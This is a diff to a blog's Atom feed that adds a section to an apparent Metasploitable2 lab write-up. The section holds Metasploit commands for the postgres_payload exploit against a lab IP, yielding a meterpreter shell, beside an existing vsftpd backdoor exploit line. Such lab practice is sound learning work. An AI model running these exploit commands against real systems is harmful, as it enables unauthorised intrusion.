@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-22T16:05:50-05:00</updated>
+  <updated>2016-06-22T16:42:58-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -261,6 +261,17 @@ msf exploit(vsftpd_234_backdoor) &gt; exploit
 <p>get the root:</p>
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>postgresql exploit</h3>
+
+<pre><code>msf &gt; use exploit/linux/postgres/postgres_payload
+msf exploit(postgres_payload) &gt; set rhost 192.168.79.179
+msf exploit(postgres_payload) &gt; exploit
+</code></pre>
+
+<p>get meterpreter:</p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
